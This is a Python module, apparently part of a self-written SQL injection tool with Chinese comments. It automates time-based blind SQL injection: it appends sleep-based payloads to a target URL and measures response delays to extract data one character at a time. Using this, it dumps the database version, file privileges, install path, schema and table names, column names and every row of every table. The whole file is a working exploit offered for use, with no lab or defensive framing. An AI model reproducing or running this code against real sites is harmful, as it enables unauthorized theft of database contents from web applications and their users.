# -*- coding: utf-8 -*-
# -*- ver	: >=3.8.0 -*-
# -*- coder : CO0kie丶 -*-
# -*- time  : 20201120 -*-

import pprint
from myhttp import HTTP
from userdata import Global_UserData

"""-----定义分隔符-----"""

Global_spilt = "!@Aa@!"
Global_ExpDict_char_min = 33
Global_ExpDict_char_max = 126

"""-----定义分隔符-----"""
pp = pprint.PrettyPrinter()
Global_ExpDict_timeout = Global_UserData['InjTimeOut']
Global_Headers = {'User-Agent': Global_UserData['User-Agent']}


class InjTime(HTTP):
    _url = None

    def Print(self, text):
        self._lock.acquire()
        print(f'>>{self._threadname} 时间脱库：{text}')
        self._lock.release()
        pass

    def ExpGet(self, Sql_Code: str, Is_Digit: bool = False):
        """
        函数：利用漏洞执行语句

        :param Sql_Code: SQL语句
        :param Is_Digit: 查询是否是纯数字
        :return: 成功返回字符串，失败返回None
        """

        # 初始化参数
        ret_str = ''
        min_i, max_i = self._char_min, self._char_max
        if Is_Digit:
            min_i, max_i = 48 - 2, 57 + 1

        self.Print(f'开始爆破{self._timeout=},{Sql_Code=}')
        self.RefNewTime()
        for i in range(1, 1000):
            for char_i in range(min_i, max_i):
                url = ' and if(ord({0})={1},sleep({2}),0)--+'.format(
                    f'SUBSTR(({Sql_Code}),{i},1)',
                    char_i, self._timeout
                )

                # 查询语句结果
                self.GET(self._url + url)
                # self.Print(f'{char_i=}[{chr(char_i)}]time={self.new_time},{url=}')

                # 如果产生sleep，则表示获取成功
                if (self.new_time - self.old_time) * 1000 > self._timeout2:
                    ret_str += chr(char_i)
                    self.Print(f'查字：{i=}[{chr(char_i)}]{ret_str=}')
                    break

                # print(f'查询字符失败：{i=}{char_i=}[{chr(char_i)}]'
                #       f'{ret_str=},{url=}')

                # 检查末尾，如果查询字符=0，则表示结尾
                url = ' and if(ord({0})=0,sleep({1}),0)--+'.format(
                    f'SUBSTR(({Sql_Code}),{i},1)', self._timeout)
                self.GET(self._url + url)
                if (self.new_time - self.old_time) * 1000 > self._timeout2:
                    self.Print(f'字符串：{i=},{ret_str=}')
                    return int(ret_str) if ret_str.isdigit() else ret_str
                pass
            pass
        return False

    def _db_init(self) -> bool:
        """
        函数：用于脱库-系统数据库

        :return: T/F=返回是否脱库成功
        """
        if self._url is None:
            return False

        # 脱库_数据库版本
        self._db['系统数据库版本'] = self.ExpGet('@@VERSION')

        # 脱库_数据库文件权限
        self._db['系统数据库文件权限'] = self.ExpGet('@@secure_file_priv')

        # 脱库_数据库安装路径
        self._db['系统数据库安装路径'] = self.ExpGet('@@basedir')

        # 脱库_系统数据库db总数
        self._db['系统数据库db总数'] = self.ExpGet(
            'SELECT COUNT(*) FROM information_schema.schemata', True)

        # 脱库_系统数据库tb总数
        self._db['系统数据库tb总数'] = self.ExpGet(
            'SELECT COUNT(*) FROM information_schema.TABLES')

        # 脱库_本数据库db名
        self._db['本数据库db名'] = self.ExpGet('SELECT DATABASE()')

        # 脱库_本数据库tb数
        self._db['本数据库tb数'] = self.ExpGet(
            'SELECT count(*) FROM information_schema.STATISTICS '
            'WHERE TABLE_SCHEMA=database()', True)

        # 脱库_本数据库tb名
        self._db['本数据库tb名'] = self.ExpGet(
            'SELECT GROUP_CONCAT(TABLE_NAME) FROM information_schema.STATISTICS '
            'WHERE TABLE_SCHEMA=database()')

        if len(self._db) > 0:
            return self._db_table()
        return False
        pass

    def _db_table(self) -> bool:
        """
        函数：脱库->数据库

        :return: T/F=成功脱库
        """

        for tb_name in self._db['本数据库tb名'].split(','):
            # print('脱库->', tb_name)
            columns, row_max = '', 0

            # 脱库_列名
            columns = self.ExpGet(
                'SELECT GROUP_CONCAT(COLUMN_NAME) FROM information_schema.COLUMNS '
                f'WHERE TABLE_NAME = \'{tb_name}\' and TABLE_SCHEMA=database()').split(',')

            self.Print(f'脱库列名->{tb_name=},{columns=}')
            self._tbs[tb_name] = [['行'] + columns]

            # 脱库_行数
            row_max = self.ExpGet('SELECT COUNT(*) FROM ' + tb_name, True)
            # self.Print(f'脱库行数->{row_max=}')

            if row_max is None or row_max == 0:
                continue
            for i in range(row_max):
                self._tbs[tb_name].append([i + 1])

            # 得到行数之后，按列脱
            for column in columns:
                if row_max == 0:
                    break
                self.Print(f'{tb_name=},{row_max=},{column}')
                data = self.ExpGet(f'SELECT GROUP_CONCAT({column}) FROM {tb_name}').split(',')
                for i in range(row_max):
                    self._tbs[tb_name][i + 1].append(data[i])
                pass
            pass
        return len(self._tbs) > 0
        pass

    def __init__(self, Lock, Name: str, Info: dict):
        """
        构造函数：初始化联合注入类

        :param Lock: 线程锁
        :param Name: 线程名
        :param Info: 传入的信息字典
        """
        super().__init__(Global_Headers)
        if '脱库' in Info:
            return
        Info['注入方式']['EXP'] = '基于时间盲注'
        Info['脱库'] = {'数据库': {}, '数据表': {}}

        self._lock = Lock
        self._threadname = Name
        self._char_min = Global_ExpDict_char_min
        self._char_max = Global_ExpDict_char_max + 1
        self._timeout = Global_ExpDict_timeout
        self._timeout2 = int(Global_ExpDict_timeout * 100 * 9)
        self._url = Info['注入方式']['基于时间盲注']

        self._db = Info['脱库']['数据库']
        self._tbs = Info['脱库']['数据表']
        self._db_init()
        pass

    pass
